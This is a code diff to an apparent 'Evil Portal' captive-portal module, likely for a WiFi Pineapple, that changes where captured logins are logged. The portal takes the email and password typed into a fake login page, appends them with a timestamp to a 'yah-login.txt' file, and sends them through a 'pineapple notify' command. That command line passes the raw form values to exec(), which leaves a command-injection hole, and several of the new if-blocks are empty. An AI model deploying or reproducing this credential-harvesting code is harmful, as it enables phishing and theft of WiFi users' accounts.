@@ -5,17 +5,44 @@ class MyPortal extends Portal
 
     public function handleAuthorization()
     {
-        // Check if evilportal-logs directory exists on sd, if not create directory
-        if (!is_dir('/sd/evilportal-logs/')) {
+        
+        $dirs = array(
+            '/root/', 
+            '/sd/',
+        );
 
-          mkdir('/sd/evilportal-logs/');
+        $dirs = array_filter($dirs, 'file_exists');
+        $dirs = array_filter($dirs, 'is_writeable');
+
+        if (empty($dirs)) {
+            die("die");
         }
-        // Append captured data to file on sd
-        // UTC timestamp
+
+        $dir = array_pop($dirs);
+        $want = $dir . DIRECTORY_SEPARATOR . 'evilportal-logs';
+
+        if (file_exists($want)) {
+        } 
+
+        else {
+            mkdir($want);
+        }
+
+        if (!file_exists($want)) {
+        }
+
+        if (!is_dir($want)) {
+        }
+
+        if (!is_writeable($want)) {
+        }
+
+        $want .= DIRECTORY_SEPARATOR;
+
         if (isset($_POST['email'])) {
             $email = isset($_POST['email']) ? $_POST['email'] : 'email';
             $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
-            file_put_contents("/sd/evilportal-logs/yah-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
+            file_put_contents("$dir/evilportal-logs/yah-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
             exec("pineapple notify $email' - '$pwd");
         }
         // handle form input or other extra things there
